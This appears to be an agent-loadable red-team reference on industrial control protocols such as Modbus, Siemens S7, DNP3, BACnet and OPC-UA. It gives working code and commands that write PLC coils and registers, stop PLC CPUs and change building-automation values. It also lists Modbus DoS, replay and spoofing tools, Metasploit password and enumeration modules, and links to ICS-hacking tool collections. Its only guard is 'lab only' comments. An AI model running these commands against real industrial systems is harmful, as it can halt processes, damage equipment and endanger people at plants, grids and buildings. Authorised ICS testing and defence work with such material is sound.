# ICS Protocol Reference

Load when an OT subtask needs protocol-specific function codes, object models, or read/write semantics.

---

## Modbus TCP (port 502)

### Function codes

| FC | Name | Read/Write | Targets |
|----|------|-----------|---------|
| 01 | Read Coils | R | Digital outputs (0x/0) |
| 02 | Read Discrete Inputs | R | Digital inputs (1x/1) |
| 03 | Read Holding Registers | R | Analog/config registers (4x/4) |
| 04 | Read Input Registers | R | Analog sensor inputs (3x/3) |
| 05 | Write Single Coil | W | One digital output |
| 06 | Write Single Register | W | One holding register |
| 15 | Write Multiple Coils | W | Bulk digital output |
| 16 | Write Multiple Registers | W | Bulk holding registers |
| 43/14 | Read Device Identification | R | Vendor, product, revision |

### pymodbus — complete read/write examples

```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient('<target>', port=502, timeout=3)
c.connect()
slave = 1  # unit ID (1–247)

# Read all common types
coils = c.read_coils(0, 64, slave=slave)
di    = c.read_discrete_inputs(0, 64, slave=slave)
hr    = c.read_holding_registers(0, 32, slave=slave)
ir    = c.read_input_registers(0, 32, slave=slave)

# Write (lab / approved only)
current = c.read_coils(0, 1, slave=slave).bits[0]
c.write_coil(0, True, slave=slave)   # force ON
c.write_coil(0, current, slave=slave)  # restore

c.close()
```

### modbuster — red team CLI tool

```bash
# Install: pip3 install pymodbus
git clone https://github.com/TacticalGator/modbuster && cd modbuster

# Read holding registers
python3 modbuster.py -t <target> -p 502 -f 3 -a 0 -c 32 -u 1

# Write coil (lab only)
python3 modbuster.py -t <target> -p 502 -f 5 -a 0 -v 1 -u 1
```

### M.A.T.R.I.X — Modbus Attack Tool

```bash
# Capabilities: read, coil/register write, overflow, DoS, replay from PCAP, response spoof
# https://github.com/yadox666/MATRIX_Modbus_Attack_Tool
python3 matrix.py --target <target> --attack read_coils
python3 matrix.py --target <target> --attack replay --pcap capture.pcap
```

### Metasploit Modbus modules

```
use auxiliary/scanner/scada/modbusclient
  set RHOSTS <target>
  set UNIT_ID 1
  set DATA_ADDRESS 0
  set FUNCCODE READ_COILS
  run
```

---

## Siemens S7comm (TCP 102)

Protocol: S7comm (legacy) and S7comm-plus (S7-1200/1500). Uses ISO-TSAP/RFC1006 encapsulation over TCP 102.

### snap7 — Python library

```python
import snap7, snap7.type

c = snap7.client.Client()
c.connect('<target>', rack=0, slot=1)   # slot=1 for S7-300, slot=0 for S7-400/1200/1500

# CPU info and state
print(c.get_cpu_info())
print(c.get_cpu_state())   # Running, Stopped, Unknown

# Read areas
# Areas: PE (inputs), PA (outputs), MK (merker/flags), DB (data block), CT (counter), TM (timer)
data = c.read_area(snap7.type.Areas.DB, db_number=1, start=0, size=100)
inputs = c.read_area(snap7.type.Areas.PE, 0, 0, 1)
outputs = c.read_area(snap7.type.Areas.PA, 0, 0, 1)

# Data block read/write
db1 = c.db_read(db_number=1, start=0, size=100)

# CPU stop/start (lab only — halts all PLC outputs)
c.plc_stop()
c.plc_hot_start()

c.disconnect()
```

### S7 attack tools

```bash
# Metasploit S7 modules
use auxiliary/scanner/scada/s7_enumerate
use auxiliary/scanner/scada/s7_300_400_passwords

# nmap s7-info script
nmap -sV --script s7-info -p 102 <target>
```

### S7comm-plus (S7-1200/1500 hardening)

S7-1200 v4+ and S7-1500 use S7comm-plus with challenge-response authentication and encrypted sessions. Older firmware versions are more permissive. snap7 may work against default-configured 1200/1500 unless access protection is enabled.

---

## EtherNet/IP / CIP (TCP 44818, UDP 2222)

CIP (Common Industrial Protocol) runs over EtherNet/IP. Used by Allen-Bradley/Rockwell PLCs (ControlLogix, MicroLogix, CompactLogix).

```bash
# nmap fingerprint
nmap -sV --script enip-info -p 44818 <target>

# cpppo — CIP tag read
pip3 install cpppo
python3 -m cpppo.server.enip.client --print '<target>' '@0x01/1/1'   # identity object

# Read controller tags (if tag access enabled)
python3 -m cpppo.server.enip.client --print '<target>' 'MyTag'

# Metasploit EtherNet/IP
use auxiliary/scanner/scada/ethernet_ip_reveal
```

---

## DNP3 (TCP/UDP 20000)

Distributed Network Protocol — used in power/water SCADA. Supports authentication in DNP3 SA (Secure Authentication v5) but most deployments use no auth.

```bash
nmap --script dnp3-info -p 20000 <target>

# Metasploit DNP3
use auxiliary/scanner/scada/dnp3_device_info

# scapy DNP3 — manual frame crafting
pip3 install scapy scapy-ics
```

---

## IEC 60870-5-104 (TCP 2404)

Used in European power grids. RTU/master protocol.

```bash
# Python iec104 library
pip3 install iec104

# Wireshark: display filter iec104
```

---

## BACnet (UDP 47808)

Building automation (HVAC, lighting, access control). No authentication in base protocol.

```bash
nmap --script bacnet-info -p U:47808 <target>

# bacnet-stack tools (Linux package: bacnet-stack-utils)
bacwi -1               # WhoIs — discover all BACnet devices on segment
bacrp <device_id> AV 0 PRESENT-VALUE   # read Analog Value object 0
bacwp <device_id> AV 0 PRESENT-VALUE 75.0   # write value (lab only)
```

---

## OPC-UA (TCP 4840)

Modern industrial interoperability protocol with optional security. Commonly deployed without authentication in OT.

```bash
# python-opcua
pip3 install opcua

python3 - <<'EOF'
from opcua import Client
c = Client("opc.tcp://<target>:4840/")
c.connect()
root = c.get_root_node()
objects = c.get_objects_node()
for child in objects.get_children():
    print(child)
c.disconnect()
EOF

# OPC UA Attack Surface: anonymous auth, deprecated SHA1 security policies,
# unencrypted sessions, node enumeration → information disclosure
```

---

## Protocol-to-tool mapping

| Protocol | Default port | Enum tools | Attack tools |
|----------|-------------|-----------|-------------|
| Modbus TCP | 502 | nmap modbus-discover, pymodbus | modbuster, M.A.T.R.I.X, Metasploit modbusclient |
| S7comm | 102 | nmap s7-info, snap7 | snap7, Metasploit s7_enumerate, s7_300_400_passwords |
| EtherNet/IP | 44818 | nmap enip-info, cpppo | cpppo, Metasploit ethernet_ip_reveal |
| DNP3 | 20000 | nmap dnp3-info | Metasploit dnp3_device_info, scapy-ics |
| BACnet | 47808/UDP | nmap bacnet-info, bacwi | bacnet-stack-utils, bacwp |
| OPC-UA | 4840 | python-opcua | Metasploit opcua_* modules |
| Profinet DCP | 34964/UDP | nmap profinet-logo, Wireshark pn_dcp | — |
| IEC 104 | 2404 | iec104 library | — |
| Modbus RTU/ASCII | serial | — | pymodbus serial client |

---

## Key resources

- Orange-Cyberdefense awesome-industrial-protocols: https://github.com/Orange-Cyberdefense/awesome-industrial-protocols
- ICS-Hacking tools collection: https://github.com/miguelob/ICS-Hacking
- Metasploit SCADA modules list: https://scadahacker.com/resources/msf-scada.html
- ICS Cybersecurity Academy tools: https://ics-cybersecurity.academy/ics-tools/
